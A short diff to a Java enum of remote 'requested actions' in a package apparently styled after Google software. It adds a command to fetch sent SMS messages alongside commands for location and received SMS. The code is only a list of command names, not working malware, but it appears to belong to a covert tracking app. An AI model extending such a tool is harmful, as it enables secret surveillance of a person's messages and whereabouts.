@@ -6,4 +6,5 @@ package com.example.tiber.googleperformancehost.SharedClasses.Communication;
 public enum RequestedAction {
 	GIVE_LOCATION,
 	GIVE_RECEIVED_SMS,
+	GIVE_SENT_SMS,
 }
